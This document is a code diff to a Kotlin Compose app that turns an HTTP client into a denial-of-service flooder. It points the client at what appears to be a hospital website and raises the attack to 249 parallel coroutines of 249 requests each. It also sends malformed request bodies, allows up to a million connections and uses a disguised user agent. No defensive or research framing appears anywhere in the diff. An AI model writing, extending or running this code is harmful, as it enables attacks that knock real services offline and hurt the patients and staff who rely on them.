@@ -25,6 +25,8 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import io.ktor.client.*
 import io.ktor.client.engine.cio.CIO
+import io.ktor.client.engine.cio.*
+import io.ktor.network.tls.*
 
 @Composable
 @Preview
@@ -57,6 +59,11 @@ fun Aster() {
             // Create a button.
             Button(onClick = {
                 asterViewModel.initIntro()
+                //chatGPT()
+
+
+
+
             }) {
                 Text("Submit")
             }
@@ -82,7 +89,7 @@ class AsterViewModel {
     }
 
     fun initIntro(){
-        val client = HttpClient(CIO)
+        val client = HttpClient()
         CoroutineScope(Dispatchers.IO).launch {
 
             try {
@@ -96,7 +103,9 @@ class AsterViewModel {
                 val statusCode = response.status.value
                 if (statusCode in 200..299) {
                     println("OK")
-                    initImpact()
+                    CoroutineScope(Dispatchers.IO).launch {
+                        chatGPT()
+                    }
                 } else if (statusCode in 300..399) {
                     println("Redirection")
                 } else if (statusCode in 400..499) {
@@ -132,24 +141,35 @@ class AsterViewModel {
                 // Set the user agent.
                 agent = "Platinum Coffee Mix 3 in 1"
             }
+            engine {
+                maxConnectionsCount = 1_000_000
+                endpoint {
+                    // this: EndpointConfig
+                    maxConnectionsPerRoute = 1_000
+                    pipelineMaxSize = 786
+                    keepAliveTime = 1_000
+                    connectTimeout = 1_000
+                    connectAttempts = 28
+                }
+            }
         }
 
         val malformedRequest = """
         GET / HTTP/1.1
-        Host: example.com
+        Host: www.oschospitalmm.com
         
         This is an invalid request
     """.trimIndent()
 
         // Perform 9 HTTP requests
-        repeat(5) {
+        repeat(249) {
 
             //GlobalScope.launch(Dispatchers.IO) {
             CoroutineScope(Dispatchers.IO).launch {
-                for (i in 0 until 1_000_000_000) {
+                for (i in 0 until 249) {
                     try {
                         val response = client.get(urlString = targetUrl.value) {
-                            //setBody(malformedRequest)
+                            setBody(malformedRequest)
                         }
                         // Handle the response here
                         //Log.i("NREQ", "Request $i completed with response: ${response.status}")
